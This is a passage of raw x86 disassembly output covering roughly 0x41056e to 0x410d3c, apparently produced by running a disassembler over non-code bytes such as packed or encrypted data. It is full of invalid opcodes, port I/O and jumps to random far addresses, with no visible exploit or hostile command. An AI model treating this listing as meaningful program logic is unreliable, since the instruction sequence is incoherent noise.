  41056e:	xor    cl,dh
  410570:	addr16 ss pop edi
  410573:	into   
  410574:	(bad)  
  410575:	loopne 0x4104f9
  410577:	inc    eax
  410578:	in     al,0xc2
  41057a:	jo     0x41054b
  41057c:	jmp    0x4105c1
  41057e:	scas   al,BYTE PTR es:[edi]
  41057f:	retf   
  410580:	dec    ecx
  410581:	adc    DWORD PTR [ebx+0x47],edi
  410584:	(bad)  
  410585:	js     0x4105ee
  410587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410588:	retf   
  410589:	xchg   esp,eax
  41058a:	push   cs
  41058b:	(bad)  
  41058c:	mov    bl,0x7
  41058e:	test   eax,0xf766f76e
  410593:	repnz jecxz 0x4105fc
  410596:	xchg   ebx,eax
  410597:	inc    esp
  410598:	sub    BYTE PTR [ecx-0x5b5a2350],bh
  41059e:	rcr    DWORD PTR [ebx-0x74192a66],1
  4105a4:	(bad)  
  4105a5:	call   0x839d3917
  4105aa:	xor    al,0x1d
  4105ac:	jmp    0xf207d2bb
  4105b1:	cmp    al,0x55
  4105b3:	xor    eax,0x454d0f4b
  4105b8:	out    0x4b,al
  4105ba:	push   esp
  4105bb:	in     al,dx
  4105bc:	mov    esi,0x84c5b4d8
  4105c1:	adc    al,0x97
  4105c3:	adc    esi,esi
  4105c5:	int3   
  4105c6:	push   cs
  4105c7:	mov    ch,0x55
  4105c9:	(bad)  
  4105cb:	adc    BYTE PTR [eax],cl
  4105cd:	adc    bh,BYTE PTR [ebx+edx*2]
  4105d0:	in     al,0x11
  4105d2:	sub    ecx,DWORD PTR [edi-0x71]
  4105d5:	repz inc BYTE PTR [eax-0x31]
  4105d9:	iret   
  4105da:	loope  0x4105c7
  4105dc:	mov    al,0x7c
  4105de:	ret    0xe14b
  4105e1:	pushf  
  4105e2:	aam    0x9d
  4105e4:	fsubr  st,st(5)
  4105e6:	and    esp,DWORD PTR [ecx-0x4ffd0caf]
  4105ec:	xchg   esi,eax
  4105ed:	in     eax,0x3
  4105ef:	fld    TBYTE PTR [eax+0x2d1cb820]
  4105f5:	xchg   eax,esp
  4105f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105f8:	sahf   
  4105f9:	or     DWORD PTR ds:0x1d3ac0f,0x50
  410600:	loopne 0x410591
  410602:	mov    eax,ds:0x498cb571
  410607:	ds inc ebx
  410609:	(bad)  
  41060b:	or     eax,ebp
  41060d:	mov    ds:0x25c0e19,eax
  410612:	cmp    edi,DWORD PTR ds:0xc3c0071
  410618:	cmp    al,0xa1
  41061a:	xor    eax,0xc7f2c12c
  41061f:	fbstp  TBYTE PTR [ebx+0x12]
  410622:	imul   BYTE PTR [eax+0x6a]
  410625:	fisubr WORD PTR ds:0xe990fae1
  41062b:	shl    BYTE PTR [ecx+0x5f0b9968],1
  410631:	adc    cl,BYTE PTR [ecx]
  410633:	or     DWORD PTR [esi+edi*2],ecx
  410636:	hlt    
  410637:	inc    eax
  410638:	mov    bh,0x10
  41063a:	adc    eax,0xda93a458
  41063f:	sub    esi,0xee110bd8
  410645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410646:	inc    ebx
  410647:	mov    cl,0xd9
  410649:	das    
  41064a:	adc    edi,ebx
  41064c:	mov    ah,0x98
  41064e:	cmp    eax,0xd13f1aad
  410653:	into   
  410654:	jno    0x410641
  410656:	out    dx,eax
  410657:	loop   0x4106a0
  410659:	inc    eax
  41065a:	add    BYTE PTR [ebx-0x5809a0b8],bh
  410660:	fsubrp st(2),st
  410662:	cld    
  410663:	daa    
  410664:	sbb    eax,0x922b6cb6
  410669:	out    dx,al
  41066a:	sub    ebx,DWORD PTR [eax-0x78]
  41066d:	jno    0x41062b
  41066f:	or     eax,0xe2b85e67
  410674:	mov    esp,0xe6de93ca
  410679:	lods   eax,DWORD PTR ds:[esi]
  41067a:	imul   esp,DWORD PTR [ebx],0xfffffffa
  41067d:	mov    edx,DWORD PTR [edx+ebx*2-0x9e01596]
  410684:	adc    DWORD PTR ds:0x45b15901,ebp
  41068a:	sbb    ebp,ebx
  41068c:	and    eax,0x62c98b39
  410691:	in     eax,0x70
  410693:	sbb    dl,ah
  410695:	dec    ebx
  410696:	push   0xebd084de
  41069b:	dec    ecx
  41069c:	rcl    BYTE PTR [esp+esi*8+0x469da678],0x95
  4106a4:	sbb    edi,ebx
  4106a6:	dec    ebx
  4106a7:	sub    eax,0x7d9568ec
  4106ac:	mov    eax,0x32aabd49
  4106b1:	xchg   ecx,eax
  4106b2:	pop    esi
  4106b3:	ficomp WORD PTR [ecx+0x72]
  4106b6:	sti    
  4106b7:	xor    eax,0x11c26c41
  4106bc:	data16 jns 0x41067b
  4106bf:	popa   
  4106c0:	ins    DWORD PTR es:[edi],dx
  4106c1:	leave  
  4106c2:	xchg   ebp,eax
  4106c3:	and    eax,0x4591f319
  4106c8:	mov    esp,0x8d2add6
  4106cd:	test   edi,eax
  4106cf:	dec    ebx
  4106d0:	stc    
  4106d1:	mov    edi,0x999e4b80
  4106d6:	push   esp
  4106d7:	sti    
  4106d8:	ret    0xa3a9
  4106db:	sub    bl,dl
  4106dd:	dec    ecx
  4106de:	loope  0x4106f4
  4106e0:	cmp    eax,0xfe490612
  4106e5:	or     eax,0x6464f59a
  4106ea:	cmp    DWORD PTR [ebx],esp
  4106ec:	leave  
  4106ed:	cmp    eax,ebp
  4106ef:	mov    eax,0x5d3c12ee
  4106f4:	in     eax,0xc8
  4106f6:	pop    edx
  4106f7:	(bad)  
  4106f8:	pusha  
  4106f9:	test   eax,0xf78474fe
  4106fe:	aas    
  4106ff:	in     al,0x38
  410701:	sub    DWORD PTR [eax-0x32],0x67
  410705:	fnstcw WORD PTR [esi]
  410707:	add    DWORD PTR [eax],0xffffff9b
  41070a:	fimul  DWORD PTR ds:0x21b6ed0f
  410710:	xchg   ebx,eax
  410711:	je     0x4106f7
  410713:	mov    bl,0x2f
  410715:	and    eax,0x6f596433
  41071a:	add    DWORD PTR [edi],edi
  41071c:	mov    ds:0x5a58940,al
  410721:	sub    bl,BYTE PTR [ecx+0x19e3eaa6]
  410727:	rol    dh,0xcb
  41072a:	ret    
  41072b:	int    0xdd
  41072d:	pop    ebx
  41072e:	xor    BYTE PTR [ebx],0x7d
  410731:	dec    esi
  410732:	loope  0x410771
  410734:	mov    bh,0x6d
  410736:	mov    DWORD PTR [ecx-0x61cbd3d4],ecx
  41073c:	xchg   esp,eax
  41073d:	call   0xdee17448
  410742:	mov    dl,0x28
  410744:	mov    ds:0xe4c08197,al
  410749:	mov    ah,BYTE PTR [ebx]
  41074b:	pop    eax
  41074c:	inc    esp
  41074d:	(bad)  
  41074e:	arpl   WORD PTR [ecx],cx
  410750:	(bad)  
  410751:	enter  0x8c66,0x7e
  410755:	push   ss
  410756:	iret   
  410757:	(bad)  
  410758:	jmp    0x6de5f509
  41075d:	and    ebx,ebx
  41075f:	xchg   ecx,eax
  410760:	fdiv   DWORD PTR [edi+ecx*1-0x4c]
  410764:	ins    BYTE PTR es:[edi],dx
  410765:	ss std 
  410767:	(bad)  
  410769:	test   DWORD PTR [edi-0x44],eax
  41076c:	xor    eax,0xeeb52a5c
  410771:	sar    DWORD PTR [ecx-0x68befeac],cl
  410777:	imul   ecx,DWORD PTR [ecx-0x1d8329b5],0x2b
  41077e:	jmp    0xa01a:0x90a4abca
  410785:	mov    DWORD PTR [eax-0x135f5cc3],ebp
  41078b:	xor    eax,0xcfbf1a09
  410790:	pop    ds
  410791:	in     al,dx
  410792:	iret   
  410793:	jbe    0x410774
  410795:	cmp    ch,BYTE PTR [esi-0x36fd8e19]
  41079b:	sub    eax,0x2642b946
  4107a0:	rcl    dl,cl
  4107a2:	popf   
  4107a3:	adc    al,0x9
  4107a5:	aaa    
  4107a6:	push   0xada68ee1
  4107ab:	scas   eax,DWORD PTR es:[edi]
  4107ac:	ret    0x9f1b
  4107af:	dec    DWORD PTR [ebx-0x4f795bf1]
  4107b5:	push   esp
  4107b6:	mov    esi,?
  4107b8:	dec    esp
  4107b9:	arpl   ax,di
  4107bb:	mov    ds:0x6649d9a5,eax
  4107c0:	push   edx
  4107c1:	pop    edi
  4107c2:	aas    
  4107c3:	and    DWORD PTR [esi-0x79b3c5b5],ecx
  4107c9:	hlt    
  4107ca:	outs   dx,BYTE PTR ds:[esi]
  4107cb:	aaa    
  4107cc:	push   esi
  4107cd:	and    eax,0xf7d8098a
  4107d2:	ss (bad) 
  4107d4:	pop    edi
  4107d5:	ja     0x41081b
  4107d7:	sub    al,0xd5
  4107d9:	cdq    
  4107da:	into   
  4107db:	shl    cl,1
  4107dd:	adc    eax,0x7433df9c
  4107e2:	cmc    
  4107e3:	add    BYTE PTR [edi],bh
  4107e5:	lea    esi,[ebp-0x5eb7d648]
  4107eb:	pushw  ss
  4107ed:	mov    esi,0x5d5f3228
  4107f2:	ins    BYTE PTR es:[edi],dx
  4107f3:	retf   
  4107f4:	pop    esp
  4107f5:	cld    
  4107f6:	inc    ebx
  4107f7:	xchg   ebp,eax
  4107f8:	push   edi
  4107f9:	xchg   ecx,eax
  4107fa:	and    BYTE PTR [esi],ch
  4107fc:	repnz sub BYTE PTR [ecx],0xf6
  410800:	scas   eax,DWORD PTR es:[edi]
  410801:	or     BYTE PTR [ecx-0x65],al
  410804:	(bad)  
  410805:	aam    0xe8
  410807:	fs addr16 (bad) 
  41080b:	addr16 daa 
  41080d:	or     BYTE PTR [eax],bl
  41080f:	shl    BYTE PTR [ebx+0x2b],0x19
  410813:	das    
  410814:	add    DWORD PTR [esi-0x7b],edi
  410817:	leave  
  410818:	in     al,0xbf
  41081a:	lods   al,BYTE PTR ds:[esi]
  41081b:	stc    
  41081c:	mov    ah,0x63
  41081e:	mov    al,0x54
  410820:	inc    edx
  410821:	cmc    
  410822:	aas    
  410823:	enter  0x7caa,0x19
  410827:	je     0x4107d3
  410829:	(bad)  
  41082a:	mov    ecx,0x838ad1cf
  41082f:	cmp    DWORD PTR [eax+0x14],esp
  410832:	mov    cl,0xeb
  410834:	mov    ebp,0x2f60ada2
  410839:	(bad)  
  41083a:	fldenv [ecx-0x5d]
  41083d:	scas   al,BYTE PTR es:[edi]
  41083e:	ja     0x410865
  410840:	pop    ax
  410842:	nop
  410843:	arpl   dx,si
  410845:	daa    
  410846:	aas    
  410847:	pop    esp
  410848:	ret    
  410849:	pop    edi
  41084a:	stc    
  41084b:	xchg   esp,eax
  41084c:	adc    eax,esi
  41084e:	inc    edi
  41084f:	pop    ebp
  410850:	(bad)  
  410851:	(bad)  
  410852:	jecxz  0x41084f
  410854:	fld    DWORD PTR [esp+eax*4+0x56]
  410858:	lea    edx,[edi]
  41085a:	and    DWORD PTR [eax+0x77],ecx
  41085d:	es ret 0x626c
  410861:	in     eax,0x21
  410863:	add    al,0x86
  410866:	jnp    0x4108b5
  410868:	pop    esi
  410869:	outs   dx,DWORD PTR ds:[esi]
  41086a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41086b:	addr16 out 0x98,eax
  41086e:	add    cl,BYTE PTR [esi+0x62137e80]
  410874:	jmp    0x410861
  410876:	and    esp,ecx
  410878:	call   0xe409:0x7951e28c
  41087f:	(bad)  
  410880:	mov    ds:0xb99a012e,eax
  410885:	ins    BYTE PTR es:[di],dx
  410887:	push   0xffffffa8
  410889:	dec    eax
  41088a:	sub    ebp,DWORD PTR [eax-0x7a6f2d52]
  410890:	pusha  
  410891:	pop    ecx
  410892:	loopne 0x410873
  410894:	loope  0x4108cd
  410896:	data16 mov ah,0x94
  410899:	sbb    al,0x91
  41089b:	and    eax,0x2eb42b29
  4108a0:	pop    esi
  4108a1:	test   al,0x81
  4108a3:	inc    ebx
  4108a5:	arpl   WORD PTR [edi+0x77],dx
  4108a8:	mov    esp,DWORD PTR [ebp-0x4ddccb8d]
  4108ae:	popf   
  4108af:	push   0xffffffa5
  4108b1:	add    ebp,esi
  4108b3:	cwde   
  4108b4:	pop    edx
  4108b5:	ins    BYTE PTR es:[edi],dx
  4108b6:	leave  
  4108b7:	mov    ecx,0x2d14f35b
  4108bc:	push   0xffffffe8
  4108be:	sub    eax,0x2e83efc7
  4108c3:	jmp    0x9b19:0x5be8706d
  4108ca:	test   BYTE PTR [edx-0x106bb5c1],dh
  4108d0:	mov    esp,0x8ec53b00
  4108d5:	inc    esi
  4108d6:	xchg   ebx,eax
  4108d7:	cmp    eax,edx
  4108d9:	jg     0x410916
  4108db:	jl     0x410922
  4108dd:	push   esp
  4108de:	or     al,0x15
  4108e0:	pop    ss
  4108e1:	sbb    BYTE PTR ds:0x9e182569,dh
  4108e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108e8:	jno    0x4108e9
  4108ea:	or     ebx,DWORD PTR [esi]
  4108ec:	and    DWORD PTR [eax-0xe],0x42bdc0f6
  4108f3:	adc    DWORD PTR [ebx-0x57],ebp
  4108f6:	arpl   WORD PTR [ebx+eax*8+0x59416578],sp
  4108fd:	repz mov edx,0x31a8b32e
  410903:	cli    
  410904:	bound  esp,QWORD PTR [ebx+0xfc59637]
  41090a:	sub    edi,DWORD PTR [esi-0x5]
  41090d:	stc    
  41090e:	xor    dh,BYTE PTR [edi-0x6e1969a6]
  410914:	mov    dl,BYTE PTR [eax-0x28]
  410917:	push   es
  410918:	pop    ds
  410919:	mov    ebp,0x55c994ed
  41091e:	lea    edx,[ebp-0x6b5420d3]
  410924:	inc    esp
  410925:	lods   eax,DWORD PTR ds:[esi]
  410926:	sub    al,0xf
  410928:	cdq    
  410929:	jo     0x41091d
  41092b:	in     eax,dx
  41092c:	sub    al,0xb6
  41092e:	push   es
  41092f:	mov    fs,WORD PTR [esi]
  410931:	fcomp  QWORD PTR [ecx+0x46]
  410934:	clc    
  410935:	mov    bh,0x3d
  410937:	and    eax,0xacc0ed3
  41093c:	mov    ch,0xe1
  41093e:	(bad)  
  41093f:	sub    ch,BYTE PTR [ebx+eax*2+0x208fb475]
  410946:	(bad)  
  410947:	jle    0x4108e5
  410949:	cmp    edx,eax
  41094b:	cmp    BYTE PTR ds:0x55b05cee,ch
  410951:	pop    edi
  410952:	add    ebp,eax
  410954:	push   edi
  410955:	dec    edx
  410956:	das    
  410957:	ror    DWORD PTR ds:0x852e8c99,cl
  41095d:	xchg   ecx,eax
  41095e:	out    0x9b,al
  410960:	xor    al,0x37
  410962:	pushf  
  410963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410964:	mov    al,bh
  410966:	push   es
  410967:	imul   ebp,DWORD PTR [ebx+esi*8-0x79],0x17e197f7
  41096f:	push   esi
  410970:	dec    ecx
  410971:	pushf  
  410972:	(bad)  
  410973:	hlt    
  410974:	bound  edx,QWORD PTR [ebx-0x32]
  410977:	adc    ch,BYTE PTR [edx+0x69]
  41097a:	pop    esp
  41097b:	bound  edx,QWORD PTR [edi]
  41097d:	je     0x4109ab
  41097f:	fild   DWORD PTR [eax+ebx*2+0x3e1c0e7f]
  410986:	(bad)  
  410987:	fidivr WORD PTR [esi-0x594e2d0f]
  41098d:	enter  0x3f2f,0x21
  410991:	cdq    
  410992:	ins    BYTE PTR es:[edi],dx
  410993:	pop    es
  410994:	scas   eax,DWORD PTR es:[edi]
  410995:	push   ecx
  410996:	pop    ebp
  410997:	or     esi,ebp
  410999:	pop    esp
  41099a:	adc    eax,ebx
  41099c:	dec    eax
  41099d:	outs   dx,BYTE PTR ds:[esi]
  41099e:	loope  0x410957
  4109a0:	clc    
  4109a1:	pop    ebp
  4109a2:	xor    DWORD PTR [edx+0x6c52d39b],ebp
  4109a8:	jns    0x410a16
  4109aa:	jnp    0x410939
  4109ac:	inc    esi
  4109ad:	lahf   
  4109ae:	lea    ebx,[edi]
  4109b0:	sti    
  4109b1:	xchg   esp,eax
  4109b2:	(bad)  
  4109b4:	jns    0x410941
  4109b6:	and    BYTE PTR ds:0xab871446,0xd
  4109bd:	xchg   edx,eax
  4109be:	lock cmp BYTE PTR [esi],0x1e
  4109c2:	in     eax,0x8c
  4109c4:	xor    ebx,esi
  4109c6:	loope  0x410978
  4109c8:	xor    cl,ah
  4109ca:	jns    0x410951
  4109cc:	fld    DWORD PTR [esi]
  4109ce:	hlt    
  4109cf:	and    dl,al
  4109d1:	shl    BYTE PTR [ebx+0x4],cl
  4109d4:	mov    bh,0xf9
  4109d6:	jp     0x4109a0
  4109d8:	bound  ebx,QWORD PTR [edx]
  4109da:	xchg   ecx,eax
  4109db:	or     eax,0x5774bcf6
  4109e0:	dec    ebx
  4109e1:	lods   eax,DWORD PTR ds:[esi]
  4109e2:	cmp    eax,0x16483c60
  4109e7:	loope  0x4109c0
  4109e9:	mov    edx,0x9d73d036
  4109ee:	sub    ebp,esi
  4109f0:	jae    0x41099b
  4109f2:	and    bl,BYTE PTR [ecx+0x2e]
  4109f5:	ins    DWORD PTR es:[edi],dx
  4109f6:	fwait
  4109f7:	cmp    al,0x11
  4109f9:	xchg   BYTE PTR [ebx+0x49],ah
  4109fc:	jne    0x4109d2
  4109fe:	int    0xea
  410a00:	mov    bl,0xce
  410a02:	test   eax,0xe9d52310
  410a07:	sbb    eax,0xbb67b34a
  410a0c:	imul   ebp,DWORD PTR [ebx-0x3a],0xfffffff3
  410a10:	in     al,dx
  410a11:	sti    
  410a12:	pop    ebx
  410a13:	call   FWORD PTR [eax]
  410a15:	push   ds
  410a16:	push   esi
  410a17:	add    eax,0xa
  410a1a:	ret    0xb3c9
  410a1d:	jmp    0x3565:0x9fe3d194
  410a24:	stos   BYTE PTR es:[edi],al
  410a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a26:	xchg   esi,eax
  410a27:	xchg   ch,ah
  410a29:	dec    ebx
  410a2a:	sub    BYTE PTR [ecx-0x16f277c3],dl
  410a30:	push   cs
  410a31:	pop    esi
  410a32:	push   edx
  410a33:	mov    esi,0xa99deca6
  410a38:	out    dx,al
  410a39:	fwait
  410a3a:	mov    eax,DWORD PTR [edx+0x20]
  410a3d:	push   ss
  410a3e:	les    esi,FWORD PTR [esi+eiz*2]
  410a41:	retf   
  410a42:	and    al,0x3a
  410a44:	and    BYTE PTR [ebx],bl
  410a46:	call   0x4c01f9c5
  410a4b:	pop    ecx
  410a4c:	jp     0x410a46
  410a4e:	ja     0x410a84
  410a50:	mov    al,ds:0xff36a9f8
  410a55:	(bad)  
  410a56:	pusha  
  410a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a59:	jae    0x410a80
  410a5b:	rcl    BYTE PTR [ebx+0x55],cl
  410a5e:	ret    0xe0e4
  410a61:	into   
  410a62:	nop
  410a63:	jns    0x410a22
  410a65:	pusha  
  410a66:	push   0xaf078cc9
  410a6b:	mov    bh,BYTE PTR [edx]
  410a6d:	dec    eax
  410a6e:	jmp    0x4109f6
  410a70:	jg     0x410a1c
  410a72:	mov    ?,WORD PTR [esi+ebx*4]
  410a75:	bound  eax,QWORD PTR [eax-0xa]
  410a78:	in     eax,dx
  410a79:	xor    ebx,edi
  410a7b:	mov    eax,ds:0x776b6e98
  410a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a81:	out    dx,al
  410a82:	test   DWORD PTR [esi+0x57789cd2],ecx
  410a88:	retf   
  410a89:	pop    edi
  410a8a:	cmp    eax,0x6d92a6cc
  410a8f:	rcl    DWORD PTR [ecx],cl
  410a91:	cmc    
  410a92:	int    0xdf
  410a94:	stos   BYTE PTR es:[edi],al
  410a95:	mov    al,ds:0x846c2692
  410a9a:	pop    ds
  410a9b:	jge    0x410ac9
  410a9d:	repnz pop eax
  410a9f:	mov    ah,0x53
  410aa1:	mov    esp,0x8bbb8e1d
  410aa6:	(bad)  
  410aa7:	stc    
  410aa8:	mov    ch,BYTE PTR [eax-0x35]
  410aab:	clc    
  410aac:	cmp    DWORD PTR [ebx],edi
  410aae:	dec    ecx
  410aaf:	call   0x38ae47f6
  410ab4:	mov    bl,0x46
  410ab6:	cwde   
  410ab7:	jno    0x410a95
  410ab9:	adc    esi,DWORD PTR [eax+0x3a167c83]
  410abf:	idiv   DWORD PTR [eax+0x66]
  410ac2:	out    0x4b,al
  410ac4:	pop    ebp
  410ac5:	mov    ebp,0x89bc9614
  410aca:	sbb    dh,bl
  410acc:	pop    ds
  410acd:	dec    ebp
  410ace:	scas   eax,DWORD PTR es:[edi]
  410acf:	mov    bl,0xf9
  410ad1:	rcr    edx,1
  410ad3:	outs   dx,BYTE PTR ds:[esi]
  410ad4:	push   eax
  410ad5:	dec    esp
  410ad6:	test   DWORD PTR ds:0xb184b7f6,eax
  410adc:	imul   esp,DWORD PTR [eax+0x2d1bacb3],0xe28261ea
  410ae6:	sub    al,0x10
  410ae8:	xlat   BYTE PTR ds:[ebx]
  410ae9:	pop    ecx
  410aea:	les    edx,FWORD PTR [eax+0x56d46f9a]
  410af0:	ret    0xec4d
  410af3:	enter  0xd089,0x89
  410af7:	xchg   edx,eax
  410af8:	push   ebp
  410af9:	(bad)  
  410afa:	loope  0x410af1
  410afc:	mov    esi,0xc7f7499e
  410b01:	jno    0x410ace
  410b03:	sbb    al,0x36
  410b05:	mov    al,BYTE PTR [ecx+0x2d]
  410b08:	jmp    0x410a9f
  410b0a:	inc    eax
  410b0b:	jnp    0x410abc
  410b0d:	jno    0x410b26
  410b0f:	pop    ebp
  410b10:	sub    ch,cl
  410b12:	dec    eax
  410b13:	aad    0xb9
  410b15:	or     DWORD PTR [eax],esp
  410b17:	pop    ebx
  410b18:	or     eax,0x1f13648e
  410b1d:	sub    esi,DWORD PTR [edi]
  410b1f:	out    dx,al
  410b20:	inc    esp
  410b21:	push   cs
  410b22:	dec    ebp
  410b23:	mov    edx,0x85fe35b
  410b28:	or     al,0xcc
  410b2a:	popf   
  410b2b:	mov    eax,ds:0x5a7c1f41
  410b30:	sbb    esp,0x6c6d6ede
  410b36:	fwait
  410b37:	into   
  410b38:	pop    edi
  410b39:	jae    0x410b1b
  410b3b:	adc    al,0xcb
  410b3d:	adc    dh,BYTE PTR [eax+0x30a2ac1d]
  410b43:	pusha  
  410b44:	out    dx,eax
  410b45:	inc    BYTE PTR [edx]
  410b47:	add    eax,0x9a988e0
  410b4c:	int    0x6
  410b4e:	sub    eax,0x945effd5
  410b53:	aaa    
  410b54:	add    DWORD PTR [esi+0x752643df],0x66
  410b5b:	inc    ebx
  410b5c:	shl    BYTE PTR [esi-0x78377c4c],0xd6
  410b63:	ficomp WORD PTR [ebx-0x4d]
  410b66:	and    bh,cl
  410b68:	jne    0x410b96
  410b6a:	mov    bh,al
  410b6c:	dec    ebx
  410b6d:	mov    edx,0xd93b76f3
  410b72:	popa   
  410b73:	mov    DWORD PTR [ecx],ebp
  410b75:	pop    ds
  410b76:	hlt    
  410b77:	aaa    
  410b78:	ja     0x410b77
  410b7a:	or     ax,0xb98
  410b7e:	rcl    BYTE PTR [eax-0x68],1
  410b81:	jno    0x410bea
  410b83:	into   
  410b84:	inc    edi
  410b85:	mov    dl,0xb6
  410b87:	shl    BYTE PTR [esp+eax*4+0x2b101090],1
  410b8e:	cmp    eax,DWORD PTR [ebp-0x42]
  410b91:	ss push ecx
  410b93:	pushf  
  410b94:	sbb    eax,0xb24e79b7
  410b99:	pop    eax
  410b9a:	cli    
  410b9b:	adc    edi,ecx
  410b9d:	(bad)  [ebx+0x41]
  410ba0:	push   es
  410ba1:	repnz sbb eax,DWORD PTR [eax]
  410ba4:	xacquire xchg BYTE PTR [ecx-0x16dc9437],bh
  410bab:	popa   
  410bac:	repnz mov ah,0x76
  410baf:	add    eax,edi
  410bb1:	in     eax,0x32
  410bb3:	outs   dx,BYTE PTR ds:[esi]
  410bb4:	pop    edi
  410bb5:	mov    esi,0x1e8cffae
  410bba:	cli    
  410bbb:	rcr    DWORD PTR [edi+0x53],0xac
  410bbf:	cmp    BYTE PTR [edi-0x5dabf0c3],bl
  410bc5:	jb     0x410be2
  410bc7:	cwde   
  410bc8:	neg    BYTE PTR ds:[esi]
  410bcb:	jp     0x410b8e
  410bcd:	sbb    al,0xc8
  410bcf:	and    eax,0x7688a24e
  410bd4:	pop    edi
  410bd5:	jmp    0x4694:0xc2b38e27
  410bdc:	outs   dx,DWORD PTR ds:[esi]
  410bdd:	test   al,0x54
  410bdf:	sbb    eax,0x94736b26
  410be4:	fimul  DWORD PTR [ecx]
  410be6:	icebp  
  410be7:	int3   
  410be8:	je     0x410ba5
  410bea:	mov    esp,0xe91f3978
  410bef:	stos   BYTE PTR es:[edi],al
  410bf0:	fisttp DWORD PTR [ebx-0x5a08e29]
  410bf6:	push   cs
  410bf7:	in     al,dx
  410bf8:	jle    0x410b8e
  410bfa:	test   al,0x34
  410bfc:	pushf  
  410bfd:	pop    ebx
  410bfe:	xchg   esi,eax
  410bff:	jmp    0xe53151fc
  410c04:	push   cs
  410c05:	push   ecx
  410c06:	sbb    al,0x68
  410c08:	inc    esp
  410c09:	(bad)  
  410c0a:	shr    DWORD PTR [esi+0x6e],cl
  410c0d:	fstp   TBYTE PTR [edi-0x5]
  410c10:	sahf   
  410c11:	jmp    0x410c02
  410c13:	ja     0x410b9e
  410c15:	aad    0xbd
  410c17:	rcr    BYTE PTR [ebp+0x7b],0xa6
  410c1b:	sub    eax,0x32d41d93
  410c20:	setne  BYTE PTR [ebx+ecx*1-0x71e7b248]
  410c28:	std    
  410c29:	call   0x38ce8a9e
  410c2e:	sbb    ch,BYTE PTR [edx-0x12]
  410c31:	adc    DWORD PTR ds:0x2e9c5eea,ecx
  410c37:	int    0x3e
  410c39:	and    bh,BYTE PTR [ebx-0x56]
  410c3c:	aad    0xad
  410c3e:	data16 hlt 
  410c40:	call   0x32bc6c56
  410c45:	pop    ebx
  410c46:	push   edi
  410c47:	aad    0xd1
  410c49:	inc    edx
  410c4a:	mov    eax,0x965632f9
  410c4f:	sbb    al,0x14
  410c51:	xchg   ebp,eax
  410c52:	dec    ebp
  410c53:	test   al,0x5f
  410c55:	lods   eax,DWORD PTR ds:[esi]
  410c56:	jp     0x410c6d
  410c58:	loop   0x410caa
  410c5a:	or     eax,0xa1398edc
  410c5f:	ins    BYTE PTR es:[edi],dx
  410c60:	ficomp WORD PTR [ebx]
  410c62:	dec    edx
  410c63:	pop    esp
  410c64:	scas   al,BYTE PTR es:[edi]
  410c65:	(bad)  
  410c66:	(bad)  
  410c67:	push   edi
  410c68:	jo     0x410cbd
  410c6a:	sub    BYTE PTR [ebp-0x79],dl
  410c6d:	cmp    bh,BYTE PTR [ecx]
  410c6f:	cmc    
  410c70:	add    BYTE PTR [ebx+0x3eff9309],dh
  410c76:	(bad)  
  410c77:	add    eax,0x4010aaaf
  410c7c:	out    0x89,eax
  410c7e:	test   al,0x22
  410c80:	adc    dh,bl
  410c82:	arpl   WORD PTR [ecx],di
  410c84:	test   al,0x5f
  410c86:	ins    DWORD PTR es:[edi],dx
  410c87:	mov    ah,0x96
  410c89:	xor    ebx,DWORD PTR [ecx-0x3ca0608c]
  410c8f:	popf   
  410c90:	inc    ecx
  410c91:	sub    al,0xd9
  410c93:	imul   ebp,DWORD PTR [edi],0xffffff96
  410c96:	xor    dl,cl
  410c98:	ret    
  410c99:	xor    esi,ebp
  410c9b:	aad    0x7c
  410c9d:	push   ds
  410c9e:	xchg   edi,eax
  410c9f:	adc    DWORD PTR [ecx-0x1f60518f],edi
  410ca5:	shl    DWORD PTR [eax+0x5f105922],1
  410cab:	adc    esp,DWORD PTR [ebx-0x9]
  410cae:	addr16 mov dl,0xba
  410cb1:	and    edx,esp
  410cb3:	or     ah,ah
  410cb5:	xchg   esi,eax
  410cb6:	xlat   BYTE PTR ds:[ebx]
  410cb7:	dec    edi
  410cb8:	stc    
  410cb9:	in     al,dx
  410cba:	lahf   
  410cbb:	mov    bl,0x44
  410cbd:	and    BYTE PTR [ebx+eiz*8-0x24],0x9
  410cc2:	push   eax
  410cc3:	add    ah,al
  410cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cc6:	push   0xffffff87
  410cc8:	and    DWORD PTR [ebp-0x51],esp
  410ccb:	clc    
  410ccc:	sti    
  410ccd:	in     eax,dx
  410cce:	lds    eax,FWORD PTR [ecx-0x3]
  410cd1:	adc    ecx,DWORD PTR [ebp-0x7f]
  410cd4:	and    al,BYTE PTR [ebx]
  410cd6:	mov    ds:0x65f773c7,al
  410cdb:	or     al,dh
  410cdd:	mov    ds:0xb667136a,al
  410ce2:	cmp    ecx,DWORD PTR [eax+eiz*2]
  410ce5:	dec    esp
  410ce6:	pop    ebx
  410ce7:	out    dx,eax
  410ce8:	dec    ebp
  410ce9:	push   eax
  410cea:	and    eax,0x8134883d
  410cef:	adc    bl,BYTE PTR [edi+0xf]
  410cf2:	ins    DWORD PTR es:[edi],dx
  410cf3:	mov    ebp,0xa092479e
  410cf8:	rol    BYTE PTR [ebp-0x7e600f20],1
  410cfe:	add    ah,BYTE PTR [edx+ecx*1+0x4a]
  410d02:	add    eax,0xbfdbc91c
  410d07:	(bad)  
  410d09:	jmp    0xe68da583
  410d0e:	add    cl,cl
  410d10:	call   0x7d89:0xf3d8d424
  410d17:	mov    WORD PTR [edx],ss
  410d19:	in     eax,0xc8
  410d1b:	mov    ds:0x6c879c7d,eax
  410d20:	mov    ah,0xdb
  410d22:	loop   0x410d40
  410d24:	mov    edi,0x242c56d6
  410d29:	in     al,0x5b
  410d2b:	pop    esi
  410d2c:	ss stos DWORD PTR es:[edi],eax
  410d2e:	mov    al,0x55
  410d30:	popf   
  410d31:	or     esi,DWORD PTR [ebp+0x2c20b703]
  410d37:	cmp    BYTE PTR [esi],0x70
  410d3a:	sub    DWORD PTR [edx],ebx
  410d3c:	(bad)  
